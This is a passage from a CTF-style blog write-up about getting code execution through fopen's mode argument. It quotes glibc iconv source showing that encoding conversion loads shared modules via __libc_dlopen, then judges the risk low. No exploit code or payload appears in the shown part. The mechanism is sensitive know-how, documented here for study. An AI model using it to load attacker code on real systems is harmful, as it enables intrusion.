class="title">derivation_step</span> *<span class="title">solution2</span> = <span class="title">solution</span>-&gt;<span class="title">next</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (solution2-&gt;cost_hi &lt; solution-&gt;cost_hi</span><br><span class="line">        || (solution2-&gt;cost_hi == solution-&gt;cost_hi</span><br><span class="line">      &amp;&amp; solution2-&gt;cost_lo &lt; solution-&gt;cost_lo))</span><br><span class="line">      solution = solution2;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Now build a data structure describing the transformation steps.  */</span></span><br><span class="line">      result = gen_steps (solution, toset_expand ?: toset,</span><br><span class="line">        fromset_expand ?: fromset, handle, nsteps);</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">gen_steps (struct derivation_step *best, <span class="keyword">const</span> <span class="keyword">char</span> *toset,</span><br><span class="line">     <span class="keyword">const</span> <span class="keyword">char</span> *fromset, struct __gconv_step **handle, <span class="keyword">size_t</span> *nsteps)</span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> STATIC_GCONV</span></span><br><span class="line">    <span class="keyword">if</span> (current-&gt;code-&gt;module_name[<span class="number">0</span>] == <span class="string">'/'</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">/* Load the module, return handle for it.  */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> __<span class="title">gconv_loaded_object</span> *<span class="title">shlib_handle</span> =</span></span><br><span class="line"><span class="class">    __<span class="title">gconv_find_shlib</span> (<span class="title">current</span>-&gt;<span class="title">code</span>-&gt;<span class="title">module_name</span>);</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (shlib_handle == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      failed = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><figcaption><span>iconv/gconv_dl.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/* Open the gconv database if necessary.  A non-negative return value</span></span><br><span class="line"><span class="comment">   means success.  */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">gconv_loaded_object</span> *</span></span><br><span class="line"><span class="class">__<span class="title">gconv_find_shlib</span> (<span class="title">const</span> <span class="title">char</span> *<span class="title">name</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">...</span><br><span class="line">  <span class="comment">/* Try to load the shared object if the usage count is 0.  This</span></span><br><span class="line"><span class="comment">     implies that if the shared object is not loadable, the handle is</span></span><br><span class="line"><span class="comment">     NULL and the usage count &gt; 0.  */</span></span><br><span class="line">  <span class="keyword">if</span> (found != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (found-&gt;counter &lt; -TRIES_BEFORE_UNLOAD)</span><br><span class="line">  &#123;</span><br><span class="line">    assert (found-&gt;handle == <span class="literal">NULL</span>);</span><br><span class="line">    found-&gt;handle = __libc_dlopen (found-&gt;name);</span><br><span class="line">    <span class="keyword">if</span> (found-&gt;handle != <span class="literal">NULL</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        found-&gt;fct = __libc_dlsym (found-&gt;handle, <span class="string">"gconv"</span>);</span><br><span class="line">        <span class="keyword">if</span> (found-&gt;fct == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Argh, no conversion function.  There is something</span></span><br><span class="line"><span class="comment">                     wrong here.  */</span></span><br><span class="line">      __gconv_release_shlib (found);</span><br><span class="line">      found = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      found-&gt;init_fct = __libc_dlsym (found-&gt;handle, <span class="string">"gconv_init"</span>);</span><br><span class="line">      found-&gt;end_fct = __libc_dlsym (found-&gt;handle, <span class="string">"gconv_end"</span>);</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>Oh, there we can see <code>__libc_dlopen</code> and <code>__libc_dlsym</code> !<br>Finally we figured out that glibc heavily employs dynamic libraries in order to realize the translation of encodings, and my PoC took advantage of this mechanism.</p>
<h1 id="Is-this-dangerous"><a href="#Is-this-dangerous" class="headerlink" title="Is this dangerous?"></a>Is this dangerous?</h1><p>Not at all I guess. There are two reasons:</p>
<ol>
<li><p>There is virtually no situation where attackers can take control of the 2nd argument of <code>fopen</code>. It should be a constant almost always.</p>
</li>
<li><p><code>GCONV_PATH</code> is considered as a “dangerous” environment variable like <code>LD_PRELOAD</code>. Actually glibc drops it off for setuid binaries(see <code>sysdeps/generic/unsecvars.h</code>).</p>
</li>
</ol>
<p>But nevertheless it is possible to abuse this mechanism perhaps, in the operations related to iconv, not with <code>fopen</code>. I don’t know.<br>I set this problem just because it was interesting.<br>Thanks.</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://hugeh0ge.github.io/2019/11/04/Getting-Arbitrary-Code-Execution-from-fopen-s-2nd-Argument/" data-id="ck2kh1pwy0000xjbe5veogfxt" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/writeup/" rel="tag">writeup</a></li></ul>

    </footer>
  </div>
  
    
  
</article>

</section>
        
          <aside id="sidebar">
  
    

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/writeup/" rel="tag">writeup</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/ctf/" style="font-size: 10px;">ctf</a> <a href="/tags/pwn/" style="font-size: 10px;">pwn</a> <a href="/tags/writeup/" style="font-size: 10px;">writeup</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2019/11/04/Getting-Arbitrary-Code-Execution-from-fopen-s-2nd-Argument/">Getting Arbitrary Code Execution from fopen&#39;s 2nd Argument</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2019 Yuki Koike<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  <script src="/fancybox/jquery.fancybox.pack.js"></script>


<script src="/js/script.js"></script>



  </div>
</body>
</html>
